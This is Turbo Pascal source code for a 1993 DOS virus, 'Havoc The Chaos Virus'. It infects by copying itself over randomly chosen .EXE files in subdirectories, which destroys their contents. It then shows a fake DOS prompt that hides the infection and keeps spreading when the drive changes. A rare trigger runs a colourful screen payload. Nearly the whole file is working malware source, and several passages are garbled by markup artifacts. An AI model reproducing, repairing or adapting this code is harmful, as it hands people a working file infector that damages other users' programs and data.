

Program HTCVirus;                                                        {$I-}
                                                                              {
You are now looking at the source code to the Havoc The Chaos Virus.  It is,
perhaps, the most colorful virus ever made.  I used direct-screen writes, so
that cut down on the size of it by 3936 bytes, so that helps...               }


Uses Crt, Dos;

Type String1 = string[1];

Const VirusSize = 11056;

Var ThisFile, FuckedFile       : File;
    Row, Column, C1, C2        : Integer;
    ThisDir                    : String;
    ThisDrive, Ch              : Char;
    Level,Color,Ccolor,Cccolor : Byte;

Procedure PutPixel (X, Y : Word; Color : Byte);
Begin
  Mem [$A000 : Y*320+X]:=Color;
End;

Procedure Switch (Var First, Second : Integer);
Var Temp : Integer;
Begin
  Temp:=First;
  First:=Second;
  Second:=Temp;
End;

Procedure Line (X1, Y1, X2, Y2, Color : Integer);
Var  LgDelta, ShDelta, LgStep, ShStep, Cycle, PointAddr : Integer;
Begin
  LgDelta:=X2-X1;
  ShDelta:=Y2-Y1;
  If LgDelta < 0="" then="" begin="" lgdelta:="-LgDelta;" lgstep:="-1;" end="" else="" lgstep:="1;" if="" shdelta="">< 0="" then="" begin="" shdelta:="-ShDelta;" shstep:="-1;" end="" else="" shstep:="1;" if="" lgdelta=""> ShDelta Then
  Begin
    Cycle:=LgDelta Shr 1;                                      { LgDelta / 2 }
    While X1 <> X2 Do
    Begin
      Mem [$A000 : Y1*320+X1]:=Color;             { PutPixel(X1, Y1, Color); }
      Inc (X1, LgStep);
      Inc (Cycle, ShDelta);
      If Cycle > LgDelta Then
      Begin
        Inc (Y1, ShStep);
        Dec (Cycle, LgDelta);
      End;
    End;
  End
  Else
  Begin
    Cycle:=ShDelta Shr 1;                                      { ShDelta / 2 }
    Switch (LgDelta, ShDelta);
    Switch (LgStep, ShStep);
    While Y1 <> Y2 Do
    Begin
      Mem [$A000 : Y1*320+X1]:=Color;             { PutPixel(X1, Y1, Color); }
      Inc (Y1, LgStep);
      Inc (Cycle, ShDelta);
      If Cycle > LgDelta Then
      Begin
        Inc (X1, ShStep);
        Dec (Cycle, LgDelta);
      End;
    End;
  End;
End;

Procedure SetMode (Mode : Byte);   { INT 10, Sub-Function 0 - Set Video Mode }
Var Regs : Registers;
Begin
  With Regs Do
  Begin
    AH:=0;
    AL:=Mode;
  End;
  INTR ($10, Regs);
End;

Procedure Attach( Filename:String);   
Var Inread, Outwrite : Byte;
    MeVariable       :Integer;
    Notice           :String;
    Myname           :String[60];

Begin
  Myname:=Paramstr(0);
  assign (ThisFile,MyName);
  Assign (FuckedFile,FileName);
  Reset (ThisFile,1);
  Reset (FuckedFile,1);
  If VirusSize > Sizeof (FuckedFile) Then
  Begin
    For MeVariable:=1 to VirusSize do
    Begin
      BlockRead(ThisFile,Inread,Sizeof(Inread));
      BlockWrite(FuckedFile,InRead,Sizeof(InRead));
    End;
  End;
Close (FuckedFile);
Close (ThisFile);
End;


Procedure Bomb;
Begin
  SetMode ($13);             { 320x200 256 Color Mode For VGA and MCGA Cards }
  C1:=1;
  C2:=1;
  Ccolor:=43;
  Ccolor:=1;
  Repeat
    PutPixel (C1, C2, 16);
    Inc (C1);
    Dec (C2);
    Inc (Ccolor);
    If Ccolor >= 50 Then Ccolor:=44;
    For Row:=125 To 135 Do             { Draw Some Lines }
    Begin
      Line (0, Row, 319, Row, Ccolor);
      Dec (Ccolor);
    End;
    For Row:=65 To 75 Do
    Begin
      Line (0, Row, 319, Row, Ccolor);
      Inc (Ccolor);
    End;
    

    (* The Sole Pixel (tm) *)
    PutPixel (C1, C2, 1);
    Delay (10);
    Color:=1;
    

    (* The Letter H *)
    For Row:=85 To 115 Do
    Begin
      For Column:=17 To 22 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=12 To 17 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=6 To 12 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter A *)
    For Row:=85 To 115 Do
    Begin
      For Column:=28 To 34 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 91 Do
    Begin
      For Column:=34 To 40 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=34 To 40 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=40 To 46 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter V *)
    For Row:=85 To 110 Do
    Begin
      For Column:=52 To 58 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=104 To 115 Do
    Begin
      For Column:=58 To 64 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 110 Do
    Begin
      For Column:=64 To 70 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter O *)
    For Row:=85 To 115 Do
    Begin
      For Column:=76 To 82 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 92 Do
    Begin
      For Column:=82 To 88 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=109 To 115 Do
    Begin
      For Column:=82 To 88 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=88 To 94 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter C *)
    For Row:=85 To 115 Do
    Begin
      For Column:=100 To 106 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 92 Do
    Begin
      For Column:=106 To 112 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=109 To 115 Do
    Begin
      For Column:=106 To 112 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter T *)
    For Row:=85 To 92 Do
    Begin
      For Column:=124 To 142 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=130 To 136 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter H *)
    For Row:=85 To 115 Do
    Begin
      For Column:=148 To 154 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=154 To 160 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=160 To 166 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter E *)
    For Row:=85 To 115 Do
    Begin
      For Column:=172 To 178 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 92 Do
    Begin
      For Column:=178 To 184 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=178 To 184 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=109 To 115 Do
    Begin
      For Column:=178 To 184 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter C *)
    For Row:=85 To 115 Do
    Begin
      For Column:=196 To 202 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 91 Do
    Begin
      For Column:=202 To 208 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=109 To 115 Do
    Begin
      For Column:=202 To 208 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter H *)
    For Row:=85 To 115 Do
    Begin
      For Column:=214 To 220 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=220 To 226 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=226 To 232 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter A *)
    For Row:=85 To 115 Do
    Begin
      For Column:=238 To 244 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 91 Do
    Begin
      For Column:=244 To 250 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=244 To 250 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=250 To 256 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter O *)
    For Row:=85 To 115 Do
    Begin
      For Column:=262 To 268 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 91 Do
    Begin
      For Column:=268 To 274 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=109 To 115 Do
    Begin
      For Column:=268 To 274 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 115 Do
    Begin
      For Column:=274 To 280 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    

    (* The Letter S *)
    For Row:=85 To 103 Do
    Begin
      For Column:=286 To 292 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=85 To 91 Do
    Begin
      For Column:=286 To 305 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=103 To 115 Do
    Begin
      For Column:=300 To 305 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=97 To 103 Do
    Begin
      For Column:=286 To 305 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    For Row:=109 To 115 Do
    Begin
      For Column:=286 To 305 Do
      Begin
        PutPixel (Column, Row, Cccolor);
      End;
    End;
    
    Inc (Cccolor);
    Color:=30;
  Until KeyPressed ;
  ReadLn;
  Color:=16;
  Ccolor:=15;
  For Row:=1 To 200 Do                                     { Draw Some Lines }
  Begin
    Line (0, Row, 319, Row, Ccolor);
    Delay (10);
  End;
  Color:=200;
  For Row:=1 to 99 Do
  Begin
    Line (0, Row, 319, Row, 16);
    Delay (5);
    Line (0, Color, 319, Color, 16);
    Delay (5);
    Dec (Color);
  End;
  Column:=319;
  For Row:=1 to 160 Do
  Begin
    PutPixel (Row, 100, 16);
    PutPixel (Row, 101, 16);
    Delay (5);
    PutPixel (Column, 100, 16);
    PutPixel (Column, 101, 16);
    Delay (5);
    Dec (Column);
  End;

  Delay (250);

  SetMode ($3);
  ClrScr;
  WriteLn ('The Tell-tale signs of the Havoc The Chaos Virus!');
  WriteLn ('Coded by Havoc The Chaos on 06/07/93 in 4 Hours with the Sole Pixel (tm)');
  Halt;
End;


Procedure FileToAttach;
Var Fileinfo         : SearchRec;
    Path             : Array [1..20] of String[30];
    Name             : Array [1..200] of String[30];
    err, nump, x     : Integer;
    Drand, Frand     : word;
    Pather, Namer, y : String[30];
    z                : Byte;

Label Mistake;
Begin
  Nump:=0;
  FindFirst('\*.*', Directory, Fileinfo);
  Err:=DosError;
  While Err=0 do
  Begin
  If (Fileinfo.Attr = Directory) and (Fileinfo.NAME[1] <> '.') Then
  Begin
    If Fileinfo.Name=Path[Nump] Then Err:=1;
    Nump:=Nump+1;
    Path[Nump]:=Fileinfo.name;
    Mistake : end;
    FindNext(Fileinfo);
  End;
  Randomize;
  Drand:=(Random(NUMP-1))+1;
  Pather:=Path[Drand];
  Pather:='\'+Pather+'\';
  Nump:=0;
  Findfirst (Pather + '*.EXE', Anyfile, Fileinfo);
  Err:=DosError;
  While Err = 0 do
  Begin                           {If Fileinfo.Name=Name[Nump] Then Err:=2;}
    Nump:=Nump+1;
    Name[Nump]:=Fileinfo.name;
    FindNext(Fileinfo);
    If Fileinfo.name=Name[Nump] then Err:=2;
  End;
  Frand:=Random(Nump-1)+1;
  Namer:=Name[Frand];
  If Nump<1 then="" exit;="" y:="Pather+Namer;" attach="" (y);="" x:="Random(1000);" getdir(0,thisdir);="" thisdrive:="ThisDir[1];" if="" x="666" then="" bomb;="" end;="" procedure="" fakedos(odrive="" :="" char);="" label="" 1;="" var="" ndrive="" :="" char;="" command="" :="" string[127];="" prompt="" :="" string;="" begin="" getdir(0,prompt);="" odrive:="Prompt[1];" repeat="" getdir(0,prompt);="" ndrive:="Prompt[1];" if="" odrive=""></1><> Ndrive Then
  Begin
    Odrive:=Ndrive;
    FileToAttach;
  End;
  1 : Write(Prompt + '>');
  ReadLn (Command);
  If Command = '' then goto 1;
  Begin
    SwapVectors;
    Exec(GetEnv('COMSPEC'), '/C ' + Command);
    SwapVectors;
    Writeln;
    If DosError <> 0 Then
    WriteLn('Could not execute COMMAND.COM');
  End;
Until 1 = 2;
End;

Begin
  FileToAttach;
  Writeln ('Cannot execute ',FExpand(ParamStr(0)));          {DOS 5.0 Command}
  Writeln;
  GetDir(0,ThisDir);
  ThisDrive:=ThisDir[1];
  Fakedos(thisdrive);
End.

